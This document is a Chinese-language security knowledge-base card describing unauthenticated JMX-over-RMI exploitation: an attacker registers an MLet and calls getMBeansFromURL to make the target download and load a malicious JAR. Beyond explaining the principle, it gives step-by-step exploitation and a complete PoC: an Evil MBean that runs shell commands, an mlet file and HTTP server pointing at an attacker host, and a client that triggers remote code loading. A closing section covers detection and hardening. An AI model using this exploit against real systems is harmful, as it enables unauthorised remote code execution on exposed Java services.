---
id: web-java-rmi-jmx-mlet-remote-mbean-load-rce
title: 未授权 JMX Connector Server + MLet 远程 MBean 加载：createMBean MLet + getMBeansFromURL 拉取攻击者 mlet/JAR 实现 RCE
type: scenario
domain: web
path: web/java/rmi
technique: jmx-mlet-remote-mbean-load-rce
tags:
- java
- jmx
- rmi
- mlet
- mbeanserver
- remote-class-loading
- rce
- unauth
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V690
  verified_at: '2026-11-13T16:38:40+08:00'
  notes: 已对照原文与15张截图逐图核对；JMX 架构/服务端客户端代码与地址(图01-03)、jconsole 连接与 MBean 属性/操作调用(图04-07)、JmxMBeanServer(图08)、ObjectName com.nanchensec.relaysec:type=aa 与 getMBeanInfo(图09-10)、Maven packaging=jar(图12)、compromise.jar+mlet 同目录(图13)、python3 -m http.server 4141(图14)、createMBean(javax.management.loading.MLet)+getMBeansFromURL 后 ClassName类名为:Evil 且弹出计算器(图15)均与卡内一致；MLet 继承 URLClassLoader、DefaultDomain:type=MLet、codebase+archive 拉 JAR 实例化注册、静态块/构造器即刻触发等原理表述与原文一致。原文未标注组件/受影响版本，未设 affected_versions。dedup：最高非自身候选为 RMI codebase 远程类加载卡等，均 related/new，非同一链；dup-scan.json 无涉及本卡 pair；未删卡。未复跑 PoC。
url: /docs/web/java/rmi/web-java-rmi-jmx-mlet-remote-mbean-load-rce/
draft: false
kb_aliases:
- JMX 未授权 RCE
- jmxrmi MLet
- getMBeansFromURL RCE
- createMBean MLet
- 恶意 MBean 加载
- mlet 远程类加载
- JMX 管理端口利用
---

## 一句话结论

当 JMX Connector Server 以 RMI 传输暴露且未配置认证（典型地址 `service:jmx:rmi:///jndi/rmi://host:port/jmxrmi`）时，任意能连到该端口的客户端都等价于拿到目标的 MBeanServer 管理权限：先 `createMBean("javax.management.loading.MLet", null)` 注册 JDK 自带的 MLet（`URLClassLoader` 子类），再 `invoke(..., "getMBeansFromURL", [攻击者 mlet URL])` 让目标解析远程 mlet 文件、按 `codebase` 下载攻击者 JAR、实例化其中的 `code` 类并注册为 MBean；随后调用该 MBean 的方法（或在类的静态块/构造器里写代码）即可执行任意命令。

## 原理

- **JMX 的角色与信任模型**：MBean 是被管理的资源，注册在 MBeanServer 中；Connector Server 把 MBeanServer 的能力通过 RMI 等传输暴露给远程 Connector Client。设计上 JMX 是给管理员远程运维用的，默认没有认证（`JMXConnectorServerFactory.newJMXConnectorServer(url, null, mbeanServer)` 的 environment 传 null），谁能连上 Connector 谁就是管理员。
- **典型暴露方式**：服务端先 `LocateRegistry.createRegistry(7896)` 起 RMI Registry，再用 `new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:7896/jmxrmi")` 创建 `JMXConnectorServer` 并 `start()`；客户端用同一个 URL `JMXConnectorFactory.connect` 即可拿到 `MBeanServerConnection`，任意 `createMBean`/`invoke`/读写属性。JMX over RMI 的 RMI 端口（connector 的 server socket）经常与 Registry 端口不同，扫描时要按服务端返回的地址或 `jmxrmi` stub 连接。
- **MLet 是什么**：`javax.management.loading.MLet` 是 JDK 标准 MBean，继承 `URLClassLoader`，用途是从远程 URL 动态部署 MBean。调用 `createMBean("javax.management.loading.MLet", null)` 会在 `DefaultDomain` 下注册一个 MLet（ObjectName 为 `DefaultDomain:type=MLet`）；重复创建抛 `InstanceAlreadyExistsException` 时改用 `getObjectInstance` 取回已有实例。
- **getMBeansFromURL 的执行链**：`getMBeansFromURL(url)` 下载并解析 mlet 文件（类 HTML/XML 文本），对每个 `<mlet>` 标签读取 `code`（类名）、`archive`（JAR）、`codebase`（远程基址）、`name`（ObjectName），然后通过 MLet 自己的 `URLClassLoader` 从 `codebase+archive` 下载 JAR、加载 `code` 类、实例化并按 `name` 注册为 MBean，返回 `ObjectInstance` 集合。**类加载/实例化发生在 getMBeansFromURL 调用期间**，所以即使不显式调用 MBean 方法，把恶意代码放在静态初始化块或构造器里也能立刻触发。
- **为什么绕过常见防护**：MLet 不经过 JNDI `trustURLCodebase` 开关，也不依赖 RMI codebase 注解；它是 JMX 自己的远程类加载特性，JEP 290 反序列化过滤器对它无效。目标只需要能出网访问攻击者的 HTTP 服务、JDK 含 `javax.management.loading` 包（标准 JDK 默认都有）。
- **MBean 规范约束**：`code` 指定的类必须符合 Standard MBean 命名/接口规范（接口 `EvilMBean`、实现类 `Evil`、空参构造器、getter/setter 规则），否则注册失败；但把恶意逻辑放在静态块/构造器或普通操作方法里都不影响合规性。
- **边界**：需要目标 JMX 端口可达且无认证/TLS；目标出网到攻击者 HTTP；若服务端禁用 MLet 类、限制 `MBeanServer` 操作权限（`MBeanPermission`/自定义 `MBeanServer` 包装）或只暴露注册了白名单 MBean 的受限视图，则失败；某些加固环境会移除 `javax.management.loading` 或使用 CustomMBeanServer。

## 触发条件

- 目标对外暴露 JMX Connector Server（RMI/IIOP/JMXMP 均可，本文为 RMI，URL 形如 `service:jmx:rmi:///jndi/rmi://host:port/jmxrmi`），未启用认证、TLS 或网络 ACL。
- 目标的 `MBeanServer` 允许 `createMBean` 与对 MLet 的 `invoke`（默认实现允许）。
- 目标能访问攻击者控制的 HTTP 服务（用于 mlet 文件与 JAR）。
- 攻击者已知或可枚举 JMX 地址与端口（RMI Registry 1099/9010 等常见端口、管理端口扫描、JMX 响应特征）。

## 利用步骤

1. 探测并确认 JMX 端点：尝试 `JMXConnectorFactory.connect(new JMXServiceURL("service:jmx:rmi:///jndi/rmi://host:port/jmxrmi"))`；连接成功即未授权可用。
2. 构造恶意 MBean：接口 `EvilMBean { void Command(String cmd); }` 与实现 `Evil implements EvilMBean`，在 `Command`（或静态块/构造器）中执行命令；用 Maven `packaging=jar` 打包并命名为 `compromise.jar`。
3. 写 mlet 文件（例如 `mlet`）：`<html><mlet code="Evil" archive="compromise.jar" name="MLetCompromise:name=evil,id=1" codebase="http://attacker:4141"></mlet></html>`。
4. 在攻击机同一目录起 HTTP 服务（`python3 -m http.server 4141`），确保目标可访问。
5. 攻击客户端连接目标后，`createMBean("javax.management.loading.MLet", null)` 创建/取回 MLet，然后 `invoke(mletName, "getMBeansFromURL", new Object[]{"http://attacker:4141/mlet"}, new String[]{"java.lang.String"})`。
6. 从返回的 `HashSet<ObjectInstance>` 取恶意 MBean 的 ObjectName，`invoke(evilName, "Command", ["id"], ["java.lang.String"])` 完成命令执行并回显/外带结果。
7. 若目标出网受限但 JMX 可达，可将 mlet/JAR 放在目标能访问的内网 HTTP 或已控主机上；若只需一次性执行，把命令写进 `Evil` 的静态块，getMBeansFromURL 成功时即触发。

## PoC

恶意 MBean（打包为 compromise.jar）：

```java
public interface EvilMBean { void Command(String cmd); }

public class Evil implements EvilMBean {
    public Evil() { }                      // Standard MBean 需要空参构造器
    public void Command(String cmd) {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (Exception e) { e.printStackTrace(); }
    }
}
```

mlet 文件（与 JAR 同目录，HTTP 根路径下）：

```html
<html><mlet code="Evil" archive="compromise.jar"
             name="MLetCompromise:name=evil,id=1"
             codebase="http://attacker:4141"></mlet></html>
```

攻击客户端：

```java
import javax.management.*;
import javax.management.remote.*;
import java.util.*;

public class JMXEvilClient {
    public static void main(String[] args) throws Exception {
        String url = "service:jmx:rmi:///jndi/rmi://target:7896/jmxrmi";
        JMXConnector connector = JMXConnectorFactory.connect(new JMXServiceURL(url));
        MBeanServerConnection conn = connector.getMBeanServerConnection();

        ObjectInstance mlet;
        try {
            mlet = conn.createMBean("javax.management.loading.MLet", null);
        } catch (InstanceAlreadyExistsException e) {
            mlet = conn.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
        }

        Object res = conn.invoke(mlet.getObjectName(), "getMBeansFromURL",
                new Object[]{"http://attacker:4141/mlet"},
                new String[]{String.class.getName()});
        Iterator<?> it = ((HashSet<?>) res).iterator();
        ObjectInstance evil = (ObjectInstance) it.next();

        conn.invoke(evil.getObjectName(), "Command", new Object[]{"id"},
                new String[]{String.class.getName()});
        connector.close();
    }
}
```

要点：mlet 中的 `code`/`archive` 与 JAR 内类名一致；`codebase` 不带尾斜杠时 MLet 会拼成 `codebase+archive`；`name` 里的域 `MLetCompromise` 会被当作 MBean 的 ObjectName。

## 变体与关联

- **静态块/构造器立即执行**：把命令写进 `Evil` 的 `static { }` 或构造器，`getMBeansFromURL` 成功解析即触发，不必再 `invoke`。
- **Jolokia/HTTP 管理桥**：Jolokia 把 JMX 操作映射为 HTTP/JSON，若未授权同样可创建 MLet；与 ActiveMQ/Jolokia 文件写入、Spring Actuator Jolokia 调 Logback/Tomcat MBean 的链可组合，见 [[web-java-component-activemq-jolokia-arbitrary-file-write-cve-2022-41678]]、[[web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-jndi-rce]]。
- **JMX 客户端连接恶意服务端**：方向相反——Kafka UI 的 JMX 监控连到攻击者 JRMP listener 时会被反序列化攻击，见 [[web-java-deser-kafka-ui-jmx-scala1-cc322-property-bypass]]；nGrinder 的 JMXServiceURL `/jndi/` 路径注入见 [[web-java-deser-jndi-ngrinder-monitor-jmx-url]]。
- **MLet 作为类加载器**：Spring Cloud Gateway SpEL 里 `new MLet(...)` 配合 `ReflectUtils.defineClass` 注入内存马，见 [[web-java-expression-spel-spring-cloud-gateway-22947-defineclass-mlet-memshell]]。
- **RMI codebase 动态类加载**：与 MLet 同为远程类加载但机制不同（serialization annotation vs MLet 的 mlet 文件），见 [[web-java-rmi-codebase-remote-class-loading]]。
- **其他 MBean 滥用**：即使不能创建 MLet，暴露的 MBeanServer 仍可调用已注册的危险 MBean（Logback `JMXConfigurator#reloadByURL`、Tomcat `MBeanFactory#createJNDIRealm` 等）。

## 检测与防御

- **暴露面**：JMX 管理端口（RMI Registry 1099、connector 随机端口、JMXMP 等）绝不应直接暴露在不可信网络；绑定 `127.0.0.1`、通过 SSH 隧道/VPN 访问，或用防火墙白名单限制来源。
- **认证与加密**：为 Connector Server 配置 `JMXAuthenticator`（用户名/密码）与 SSL/TLS；使用 `JMXConnectorServerFactory` 的 environment 设置 `jmx.remote.x.access.file` 或自定义 `MBeanServerForwarder` 做授权。
- **权限收窄**：限制 `createMBean` 与 MLet 的调用（`MBeanServerPermission`/`MBeanPermission`），生产环境不允许动态部署 MBean；移除或替换 `javax.management.loading.MLet`。
- **检测**：JMX/RMI 流量中出现 `createMBean` 目标类名 `javax.management.loading.MLet`、`getMBeansFromURL` 方法调用；目标 JVM 出网 HTTP 拉取 `.jar` 并注册新 MBean；短时间内新出现 `DefaultDomain:type=MLet` 与陌生域 MBean。
- **根因**：JMX 远程管理默认信任“能连上的人”，MLet 又把“远程类加载”做成了管理功能；未授权暴露等于把任意类加载与代码执行直接交给攻击者。
